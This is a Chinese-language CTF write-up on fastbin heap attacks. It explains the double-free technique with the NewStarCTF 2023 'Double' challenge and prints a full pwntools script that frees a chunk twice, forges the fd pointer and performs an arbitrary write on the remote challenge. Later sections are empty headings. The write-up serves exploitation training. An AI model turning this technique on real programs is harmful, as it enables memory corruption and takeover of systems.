---
title: Fastbin Attack
tags: [ctf-pwn,heap]
date: 2023-10-24 10:58:00
categories: [ctf-pwn]
excerpt: fastbin的几种攻击方法
---

#### Fastbin

##### Double Free

以buuoj NewStarCTF 2023 week 4 Double为例

目的是向任意地址写入值

经典的网图

![](/img/Fastbin/1.jpg)

原理在于，三次free之后，第一次把chunk1 malloc出来之后，可以对content部分进行编辑，而content对于第三次malloc出来的chunk1是fd，这个fd在第四次malloc时，会从自己写的地址进行malloc，然后这个malloc出来的块的content又是可编辑的。这样就实现了任意地址写。

```python
from pwn import *

#p = process("./Double")
p = remote("node4.buuoj.cn", 25942)

#gdb.attach(p, "b *0x080486B5")

def add(idx, content):
  p.recvuntil(b">\n")
  p.sendline(b"1")
  p.recvuntil(b"Input idx\n")
  p.sendline(idx)
  p.recvuntil(b"Input content\n")
  p.sendline(content)
  

def free(idx):
  p.recvuntil(b">\n")
  p.sendline(b"2")
  p.recvuntil(b"Input idx\n")
  p.sendline(idx)

def check():  
  p.recvuntil(b">\n")
  p.sendline(b"3")
  
  
add(b'1', b"aaaa")
add(b'2', b"bbbb")
free(b'1')
free(b'2')
free(b'1')

add(b'1', p64(0x602070 - 16))

add(b'2', b'dddd')

add(b'3', b'eeee')

add(b'4', p64(1638))

check()

p.interactive()
```



##### House of Spirit



##### Alloc to Stack



##### Arbitary Alloc